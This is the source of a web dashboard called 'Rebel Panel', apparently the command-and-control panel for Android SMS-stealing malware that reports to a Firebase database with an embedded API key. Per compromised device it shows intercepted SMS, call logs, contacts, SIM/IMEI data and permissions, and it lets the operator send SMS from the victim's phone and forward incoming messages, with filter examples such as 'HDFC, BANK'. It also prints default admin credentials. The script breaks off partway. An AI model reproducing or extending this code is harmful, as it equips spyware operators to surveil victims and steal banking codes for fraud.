<?php
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Rebel Panel — Real-Time Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
  <style>
    :root{--bg:#0a0a0f;--surface:#111118;--card:#16161f;--border:#2a2a3a;--accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;--success:#00ff9d;--error:#ff4466}
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.03) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
    .wrapper{position:relative;z-index:1}

    /* ─── LOGIN ─── */
    #loginPage{position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;padding:20px}
    #loginPage.hidden{display:none!important}
    .login-card{background:var(--card);border:1px solid var(--border);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,0.5)}
    .login-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:22px 0 0 22px}
    .login-logo{display:flex;align-items:center;gap:14px;margin-bottom:28px}
    .login-logo .rebel{font-size:24px;font-weight:800;letter-spacing:-1px}
    .login-logo .rebel em{font-style:normal;color:var(--accent)}
    .login-logo .panel-sub{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:3px;margin-top:2px}
    .login-card h2{font-size:20px;font-weight:800;margin-bottom:4px}
    .login-card h2 span{color:var(--accent)}
    .login-card .login-sub{color:var(--muted);font-size:12px;margin-bottom:24px}
    .login-error{background:rgba(255,68,102,0.1);border:1px solid rgba(255,68,102,0.3);color:var(--error);border-radius:8px;padding:10px 14px;font-family:'Space Mono',monospace;font-size:11px;margin-bottom:14px;display:none}
    .remember-row{display:flex;align-items:center;gap:10px;margin:14px 0 18px}
    .remember-row input[type=checkbox]{width:16px;height:16px;accent-color:var(--accent);cursor:pointer}
    .remember-row label{font-size:11px;color:var(--muted);cursor:pointer}
    .login-hint{margin-top:16px;text-align:center;font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    label{font-size:9px;font-family:'Space Mono',monospace;color:var(--muted);letter-spacing:1.5px;display:block;margin-bottom:5px;text-transform:uppercase}
    input,textarea{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:13px;outline:none;transition:border-color 0.2s}
    input:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,60,60,0.1)}
    .btn{width:100%;padding:13px;border-radius:10px;border:none;background:linear-gradient(135deg,var(--accent) 0%,#cc0000 100%);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:14px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;text-transform:uppercase}
    .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,60,60,0.4)}
    .btn-sm{padding:10px 22px;border-radius:8px;border:none;background:linear-gradient(135deg,var(--accent),#cc0000);color:#fff;font-family:'Syne',sans-serif;font-weight:700;font-size:13px;cursor:pointer;transition:all 0.2s;width:auto}
    .btn-sm:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(255,60,60,0.35)}

    /* ─── HEADER ─── */
    header{padding:16px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:rgba(10,10,15,0.95);backdrop-filter:blur(14px);position:sticky;top:0;z-index:100}
    .logo{display:flex;align-items:center;gap:12px}
    .logo-mark{width:34px;height:34px;filter:drop-shadow(0 0 6px rgba(255,60,60,0.6));animation:logoPulse 2.5s ease-in-out infinite}
    @keyframes logoPulse{0%,100%{filter:drop-shadow(0 0 4px rgba(255,60,60,0.4))}50%{filter:drop-shadow(0 0 14px rgba(255,60,60,0.9))}}
    .logo-text .rebel{font-size:20px;font-weight:800;letter-spacing:-1px;line-height:1}
    .logo-text .rebel em{font-style:normal;color:var(--accent)}
    .logo-text .panel-sub{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:3px}
    .status-pill{display:flex;align-items:center;gap:8px;padding:5px 14px;border-radius:100px;border:1px solid var(--border);font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);transition:all 0.3s}
    .status-pill.connected{border-color:var(--success);color:var(--success)}
    .status-pill .status-dot{width:6px;height:6px;border-radius:50%;background:var(--muted)}
    .status-pill.connected .status-dot{background:var(--success);box-shadow:0 0 6px var(--success);animation:blink 1.5s ease-in-out infinite}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}

    /* ─── LAYOUT ─── */
    .main-layout{display:flex;min-height:calc(100vh - 65px)}
    .hidden{display:none!important}

    /* ─── SIDEBAR ─── */
    .sidebar{width:270px;flex-shrink:0;border-right:1px solid var(--border);background:rgba(10,10,15,0.85);height:calc(100vh - 65px);position:sticky;top:65px;overflow-y:auto;display:flex;flex-direction:column}
    .sidebar::-webkit-scrollbar{width:3px}
    .sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
    .sidebar-hdr{padding:14px 16px 10px;border-bottom:1px solid var(--border)}
    .sidebar-title{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px}
    .sidebar-stats{display:flex;gap:6px}
    .mini-stat{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px;text-align:center}
    .mini-val{font-size:20px;font-weight:800;line-height:1}
    .mini-val.t{color:var(--accent)}
    .mini-val.on{color:var(--success)}
    .mini-val.off{color:var(--muted)}
    .mini-lbl{font-family:'Space Mono',monospace;font-size:7px;color:var(--muted);letter-spacing:1px;margin-top:3px}
    .sidebar-search{padding:10px 12px;border-bottom:1px solid var(--border)}
    .sidebar-search input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:7px 10px;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;outline:none}
    .sidebar-search input:focus{border-color:var(--accent)}
    .dev-list{flex:1;padding:8px}
    .dev-item{padding:12px;border:1px solid var(--border);border-radius:10px;margin-bottom:6px;cursor:pointer;transition:all 0.15s;background:var(--surface);position:relative;overflow:hidden}
    .dev-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--muted);border-radius:10px 0 0 10px;transition:all 0.2s}
    .dev-item:hover{border-color:rgba(255,60,60,0.3);background:rgba(255,60,60,0.03)}
    .dev-item:hover::before{background:var(--accent)}
    .dev-item.active{border-color:var(--accent);background:rgba(255,60,60,0.06)}
    .dev-item.active::before{background:var(--accent);box-shadow:0 0 8px rgba(255,60,60,0.5)}
    .dev-item.is-online::before{background:var(--success)}
    .dev-item.is-online.active::before{background:var(--success);box-shadow:0 0 8px rgba(0,255,157,0.5)}
    .dev-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px}
    .dev-name{font-weight:700;font-size:13px}
    .dev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
    .dev-dot.online{background:var(--success);box-shadow:0 0 5px var(--success);animation:blink 2s infinite}
    .dev-dot.offline{background:var(--muted)}
    .dev-uid{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:6px}
    .dev-chips{display:flex;gap:5px;flex-wrap:wrap}
    .dchip{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);background:var(--bg);padding:2px 7px;border-radius:20px;border:1px solid var(--border)}
    .dchip.bat-hi{color:var(--success);border-color:rgba(0,255,157,0.2)}
    .dchip.bat-md{color:var(--accent2);border-color:rgba(255,149,0,0.2)}
    .dchip.bat-lo{color:var(--error);border-color:rgba(255,68,102,0.2)}
    .dev-empty{text-align:center;padding:30px 14px;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px}

    /* ─── MAIN AREA ─── */
    .main-area{flex:1;overflow-x:hidden}
    .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:14px;opacity:0.35}
    .empty-icon{font-size:52px}
    .empty-txt{font-family:'Space Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:2px}

    /* ─── DEVICE DETAIL ─── */
    .dev-hero{padding:22px 28px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,rgba(255,60,60,0.04) 0%,transparent 60%);position:relative;overflow:hidden}
    .dev-hero::after{content:'';position:absolute;top:-40%;right:-5%;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(255,60,60,0.05),transparent 70%);pointer-events:none}
    .hero-top{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px}
    .hero-name{font-size:22px;font-weight:800}
    .hero-brand{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px}
    .hero-id{font-family:'Space Mono',monospace;font-size:8px;color:var(--accent);margin-top:4px;letter-spacing:1px}
    .hero-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:20px;font-family:'Space Mono',monospace;font-size:9px;font-weight:700;letter-spacing:1px}
    .hero-badge.online{background:rgba(0,255,157,0.1);border:1px solid rgba(0,255,157,0.25);color:var(--success)}
    .hero-badge.online::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--success);animation:blink 1.5s infinite}
    .hero-badge.offline{background:rgba(107,107,136,0.1);border:1px solid rgba(107,107,136,0.2);color:var(--muted)}
    .hero-badge.offline::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--muted)}
    .hero-metrics{display:flex;gap:20px;flex-wrap:wrap}
    .hm{display:flex;flex-direction:column;gap:3px}
    .hm-lbl{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px}
    .hm-val{font-size:14px;font-weight:800;color:var(--accent)}
    .hm-val.green{color:var(--success)}
    .hm-val.orange{color:var(--accent2)}

    /* ─── DATA TABS ─── */
    .data-tabs{display:flex;gap:0;padding:0 28px;border-bottom:1px solid var(--border);background:rgba(10,10,15,0.7);overflow-x:auto}
    .data-tab{padding:11px 14px;border:none;background:transparent;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;letter-spacing:1px;text-transform:uppercase;border-bottom:2px solid transparent;transition:all 0.2s;margin-bottom:-1px;white-space:nowrap;display:flex;align-items:center;gap:5px;flex-shrink:0}
    .data-tab:hover{color:var(--text)}
    .data-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
    .tab-badge{background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.3);color:var(--accent);padding:1px 6px;border-radius:8px;font-size:8px}
    .data-section{padding:22px 28px 50px;display:none}
    .data-section.active{display:block}

    /* ─── TABLES ─── */
    .realtime-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:100px;background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2)}
    .rt-dot{width:5px;height:5px;border-radius:50%;background:var(--accent2);animation:blink 1s ease-in-out infinite}
    .sec-title{font-size:22px;font-weight:800;margin-bottom:4px}
    .sec-title span{color:var(--accent)}
    .dm-toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
    .dm-search{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none;width:100%;max-width:280px}
    .dm-search:focus{border-color:var(--accent)}
    .tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto}
    .tbl{width:100%;border-collapse:collapse;min-width:450px}
    .tbl thead tr{background:rgba(255,60,60,0.05)}
    .tbl th{padding:10px 14px;font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-align:left;white-space:nowrap;text-transform:uppercase;border-bottom:1px solid var(--border)}
    .tbl tbody tr{border-bottom:1px solid rgba(42,42,58,0.4);transition:background 0.1s}
    .tbl tbody tr:last-child{border-bottom:none}
    .tbl tbody tr:hover{background:rgba(255,255,255,0.015)}
    .tbl td{padding:10px 14px;font-size:12px;vertical-align:middle}
    .mono{font-family:'Space Mono',monospace;font-size:9px}
    .tbl-empty{text-align:center;padding:36px;color:var(--muted);font-size:12px}
    .sbadge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:14px;font-family:'Space Mono',monospace;font-size:8px;font-weight:700}
    .sbadge.inbox,.sbadge.incoming{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
    .sbadge.sent,.sbadge.outgoing{background:rgba(255,149,0,0.1);color:var(--accent2);border:1px solid rgba(255,149,0,0.2)}
    .sbadge.missed,.sbadge.offline{background:rgba(255,68,102,0.1);color:var(--error);border:1px solid rgba(255,68,102,0.2)}
    .sbadge.granted{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
    .sbadge.denied{background:rgba(255,68,102,0.1);color:var(--error);border:1px solid rgba(255,68,102,0.2)}

    /* ─── SIM CARDS ─── */
    .sim-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:12px}
    .sim-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;overflow:hidden}
    .sim-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2))}
    .sim-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;border-bottom:1px solid rgba(42,42,58,0.4);gap:8px}
    .sim-row:last-child{border-bottom:none}
    .sim-key{font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2);min-width:100px}
    .sim-val{font-family:'Space Mono',monospace;font-size:10px;color:var(--text);text-align:right;word-break:break-all;max-width:55%}

    /* ─── PERMS GRID ─── */
    .perm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
    .perm-item{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:11px 14px;display:flex;align-items:center;justify-content:space-between;gap:8px}
    .perm-name{font-family:'Space Mono',monospace;font-size:9px;color:var(--text);letter-spacing:0.5px;text-transform:uppercase}

    /* ─── FORM ─── */
    .config-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:24px;position:relative;overflow:hidden;max-width:520px;margin:14px 0}
    .config-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
    .input-group{display:flex;flex-direction:column;gap:12px;margin-bottom:16px}
    textarea{resize:vertical;min-height:80px}

    /* ─── TOAST ─── */
    .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px}
    .toast{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:'Space Mono',monospace;font-size:11px;color:var(--text);display:flex;align-items:center;gap:10px;min-width:220px;animation:toastIn 0.25s ease;box-shadow:0 6px 24px rgba(0,0,0,0.4)}
    .toast.success{border-color:rgba(0,255,157,0.3)}
    .toast.error{border-color:rgba(255,68,102,0.3)}
    @keyframes toastIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
    .toast.out{animation:toastOut 0.2s ease forwards}
    @keyframes toastOut{to{opacity:0;transform:translateX(20px)}}

    /* ─── FOOTER ─── */
    footer{border-top:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
    .footer-brand{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    .footer-brand strong{color:var(--accent)}

    @media(max-width:900px){
      .sidebar{width:100%;height:auto;position:relative;top:0;border-right:none;border-bottom:1px solid var(--border)}
      .main-layout{flex-direction:column}
      .dev-hero,.data-section{padding:16px}
    }

    /* SMS Modal */
    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9990;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
    .modal-overlay.hidden{display:none!important}
    .modal-box{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:24px;width:100%;max-width:500px;position:relative;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.6)}
    .modal-box::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2))}
    .modal-from{font-family:'Space Mono',monospace;font-size:11px;color:var(--accent2);margin-bottom:4px;letter-spacing:1px}
    .modal-date{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:14px}
    .modal-body{font-size:14px;line-height:1.7;color:var(--text);white-space:pre-wrap;word-break:break-word;max-height:300px;overflow-y:auto;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
    .modal-body::-webkit-scrollbar{width:4px}
    .modal-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
    .modal-close{position:absolute;top:14px;right:16px;background:transparent;border:none;color:var(--muted);font-size:20px;cursor:pointer;line-height:1;padding:4px 8px;border-radius:6px;transition:all 0.2s}
    .modal-close:hover{background:rgba(255,60,60,0.1);color:var(--accent)}
    .sms-row-click{cursor:pointer}
    .sms-row-click:hover{background:rgba(255,60,60,0.04)!important}
  </style>
</head>
<body>

<!-- LOGIN -->
<div id="loginPage">
  <div class="login-card">
    <div class="login-logo">
      <svg width="34" height="34" viewBox="0 0 38 38" fill="none" style="filter:drop-shadow(0 0 6px rgba(255,60,60,0.6))"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
      <div><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">REAL-TIME DASHBOARD</div></div>
    </div>
    <h2>Admin <span>Login</span></h2>
    <p class="login-sub">Enter credentials to access panel.</p>
    <div id="loginError" class="login-error">❌ Wrong credentials!</div>
    <div class="input-group">
      <div><label>Username</label><input type="text" id="loginUser" placeholder="admin" autocomplete="username"/></div>
      <div><label>Password</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/></div>
    </div>
    <div class="remember-row"><input type="checkbox" id="rememberMe"/><label for="rememberMe">Remember me</label></div>
    <button class="btn" onclick="doLogin()">🔐 Login</button>
    <div class="login-hint">Default: admin / rebel2024</div>
  </div>
</div>

<div class="wrapper">
<!-- HEADER -->
<header>
  <div class="logo">
    <svg class="logo-mark" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
    <div class="logo-text"><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">Real-Time Dashboard</div></div>
  </div>
  <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
</header>

<!-- MAIN LAYOUT -->
<div class="main-layout" id="mainLayout" style="display:none">

  <!-- SIDEBAR -->
  <div class="sidebar">
    <div class="sidebar-hdr">
      <div class="sidebar-title">Connected Devices</div>
      <div class="sidebar-stats">
        <div class="mini-stat"><div class="mini-val t" id="stTotal">0</div><div class="mini-lbl">TOTAL</div></div>
        <div class="mini-stat"><div class="mini-val on" id="stOnline">0</div><div class="mini-lbl">ONLINE</div></div>
        <div class="mini-stat"><div class="mini-val off" id="stOffline">0</div><div class="mini-lbl">OFFLINE</div></div>
      </div>
    </div>
    <div class="sidebar-search">
      <input placeholder="Search devices..." id="devSearch" oninput="renderSidebar()" autocomplete="off"/>
    </div>
    <div class="dev-list" id="devList">
      <div class="dev-empty">📡 No devices connected</div>
    </div>
  </div>

  <!-- MAIN AREA -->
  <div class="main-area">
    <!-- EMPTY STATE -->
    <div class="empty-state" id="emptyState">
      <div class="empty-icon">📡</div>
      <div class="empty-txt">Select a device to view data</div>
    </div>

    <!-- DEVICE DETAIL -->
    <div id="deviceDetail" class="hidden">

      <!-- HERO -->
      <div class="dev-hero">
        <div class="hero-top">
          <div>
            <div class="hero-name" id="dName">—</div>
            <div class="hero-brand" id="dBrand">—</div>
            <div class="hero-id" id="dId">—</div>
          </div>
          <div id="dBadge" class="hero-badge offline">OFFLINE</div>
        </div>
        <div class="hero-metrics">
          <div class="hm"><div class="hm-lbl">BATTERY</div><div class="hm-val" id="dBat">—</div></div>
          <div class="hm"><div class="hm-lbl">NETWORK</div><div class="hm-val green" id="dNet">—</div></div>
          <div class="hm"><div class="hm-lbl">ANDROID</div><div class="hm-val" id="dAndroid">—</div></div>
          <div class="hm"><div class="hm-lbl">SMS COUNT</div><div class="hm-val orange" id="dSmsCount">—</div></div>
          <div class="hm"><div class="hm-lbl">LAST SEEN</div><div class="hm-val" id="dLastSeen">—</div></div>
        </div>
      </div>

      <!-- DATA TABS -->
      <div class="data-tabs">
        <button class="data-tab active" onclick="switchDataTab('sms',this)">💬 SMS <span class="tab-badge" id="tc-sms">0</span></button>
        <button class="data-tab" onclick="switchDataTab('calls',this)">📞 Calls <span class="tab-badge" id="tc-calls">0</span></button>
        <button class="data-tab" onclick="switchDataTab('contacts',this)">👥 Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
        <button class="data-tab" onclick="switchDataTab('sim',this)">📶 SIM / IMEI</button>
        <button class="data-tab" onclick="switchDataTab('perms',this)">🔐 Permissions</button>
        <button class="data-tab" onclick="switchDataTab('sendsms',this)">📤 Send SMS</button>
        <button class="data-tab" onclick="switchDataTab('forward',this)">↗️ Forwarding</button>
      </div>

      <!-- SMS -->
      <div class="data-section active" id="tab-sms">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
          <div class="sec-title">SMS <span>Messages</span></div>
          <input class="dm-search" placeholder="Search messages..." oninput="filterRows('smsTbody',this.value)"/>
        </div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
        <tbody id="smsTbody"><tr><td colspan="5" class="tbl-empty">No SMS data</td></tr></tbody></table></div>
        <div id="smsEmpty" class="tbl-empty" style="display:none">📭 No SMS data. Grant READ_SMS on device.</div>
      </div>

      <!-- CALLS -->
      <div class="data-section" id="tab-calls">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
          <div class="sec-title">Call <span>History</span></div>
          <input class="dm-search" placeholder="Search calls..." oninput="filterRows('callsTbody',this.value)"/>
        </div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Contact</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead>
        <tbody id="callsTbody"><tr><td colspan="6" class="tbl-empty">No call data</td></tr></tbody></table></div>
      </div>

      <!-- CONTACTS -->
      <div class="data-section" id="tab-contacts">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
          <div class="sec-title">Contacts <span>List</span></div>
          <input class="dm-search" placeholder="Search contacts..." oninput="filterRows('contactsTbody',this.value)"/>
        </div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Name</th><th>Phone</th></tr></thead>
        <tbody id="contactsTbody"><tr><td colspan="3" class="tbl-empty">No contacts data</td></tr></tbody></table></div>
      </div>

      <!-- SIM -->
      <div class="data-section" id="tab-sim">
        <div class="sec-title" style="margin-bottom:8px">SIM <span>Information</span></div>
        <div class="sim-grid" id="simGrid"><div style="color:var(--muted);font-family:'Space Mono',monospace;font-size:10px">Loading...</div></div>
      </div>

      <!-- PERMS -->
      <div class="data-section" id="tab-perms">
        <div class="sec-title" style="margin-bottom:8px">App <span>Permissions</span></div>
        <div class="perm-grid" id="permGrid"></div>
      </div>

      <!-- SEND SMS -->
      <div class="data-section" id="tab-sendsms">
        <div class="sec-title" style="margin-bottom:4px">Send <span>SMS</span></div>
        <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
        <div class="config-card">
          <div class="input-group">
            <div><label>📞 To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
            <div><label>💬 Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
          </div>
          <button class="btn-sm" onclick="sendSms()">📤 Send SMS to Device</button>
          <div id="sendStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
        </div>
        <div class="sec-title" style="margin:20px 0 10px">Sent <span>History</span></div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>To</th><th>Message</th><th>Status</th><th>Time</th></tr></thead>
        <tbody id="sentTbody"></tbody></table></div>
      </div>

      <!-- FORWARDING -->
      <div class="data-section" id="tab-forward">
        <div class="sec-title" style="margin-bottom:8px">SMS <span>Forwarding</span></div>
        <div class="config-card">
          <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
            <label style="margin:0;font-size:11px;color:var(--text)">Enable Forwarding</label>
            <input type="checkbox" id="fwToggle" onchange="toggleFw()" style="width:18px;height:18px;accent-color:var(--accent)"/>
          </div>
          <div class="input-group">
            <div><label>📞 Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
            <div style="display:flex;align-items:center;gap:12px">
              <label style="margin:0;font-size:11px;color:var(--text)">Forward All SMS</label>
              <input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwFilterDiv').style.display=this.checked?'none':'block'" style="width:18px;height:18px;accent-color:var(--accent)"/>
            </div>
            <div id="fwFilterDiv" style="display:none"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
          </div>
          <button class="btn-sm" onclick="saveFw()">💾 Save Settings</button>
        </div>
        <div class="sec-title" style="margin:20px 0 10px">Forwarding <span>History</span></div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead>
        <tbody id="fwTbody"></tbody></table></div>
      </div>

    </div><!-- /deviceDetail -->
  </div><!-- /main-area -->
</div><!-- /main-layout -->

<footer>
  <div class="footer-brand"><strong>Rebel Panel</strong> — SpinPlay99 Real-Time Dashboard</div>
  <div class="footer-brand" id="footerTime"></div>
</footer>
</div><!-- /wrapper -->


<!-- SMS Full Message Modal -->
<div class="modal-overlay hidden" id="smsModal" onclick="closeSmsModal(event)">
  <div class="modal-box">
    <button class="modal-close" onclick="document.getElementById('smsModal').classList.add('hidden')">✕</button>
    <div class="modal-from" id="modalFrom"></div>
    <div class="modal-date" id="modalDate"></div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>

<div class="toast-container" id="toastContainer"></div>

<script>
var DB, allDevs=[], selDev='', activeListeners={};

// ═══ FIREBASE ═══
(function(){
  try {
    firebase.initializeApp({
      apiKey:"AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I",
      authDomain:"spinplay99.firebaseapp.com",
      databaseURL:"https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId:"spinplay99",
      storageBucket:"spinplay99.firebasestorage.app",
      messagingSenderId:"8121733414",
      appId:"1:8121733414:web:04b9ae5df1b6bc413e31e7"
    });
    DB = firebase.database();
    setStatus('connected','Connected');
    startDeviceListener();
  } catch(e) {
    setStatus('error','Connection Error');
    console.error('Firebase init error:', e);
  }
})();

function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}

// ═══ DEVICE LISTENER ═══
// Per-device meta storage (lightweight only)
var devMeta = {};
var devListeners = {};

function startDeviceListener(){
  var REST = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";

  // Step 1: Get device IDs only via REST shallow query (no heavy data downloaded)
  function fetchDeviceIds(){
    fetch(REST + '/devices.json?shallow=true')
      .then(function(r){ return r.json(); })
      .then(function(ids){
        if(!ids){ renderSidebar(); updateStats(); return; }
        Object.keys(ids).forEach(function(id){
          if(!devListeners[id]) attachDeviceListeners(id);
        });
      })
      .catch(function(){ setTimeout(fetchDeviceIds, 5000); });
  }
  fetchDeviceIds();
  // Refresh device list every 30s to catch new devices
  setInterval(fetchDeviceIds, 30000);
}

// Step 2: Per-device lightweight listeners (only meta paths, NOT sms/calls/contacts)
function attachDeviceListeners(id){
  devListeners[id] = true;
  if(!devMeta[id]) devMeta[id] = {id:id,name:'Loading...',brand:'',android:'',status:'offline',battery:0,network:'?',charging:false,lastSeen:0,smsCount:0};

  // online_status
  DB.ref('devices/'+id+'/online_status').on('value', function(s){
    devMeta[id].online_status = s.val();
    refreshDevList();
  });
  // live_data (battery, network, timestamp, sms count)
  DB.ref('devices/'+id+'/live_data').on('value', function(s){
    var live = s.val()||{};
    var now = Date.now();
    var ts = live.timestamp_millis||0;
    var tsAge = (ts>0 && now>ts)?(now-ts):0;
    devMeta[id].battery   = live.battery_level||0;
    devMeta[id].network   = live.network_type||'?';
    devMeta[id].charging  = live.is_charging||false;
    devMeta[id].lastSeen  = ts||0;
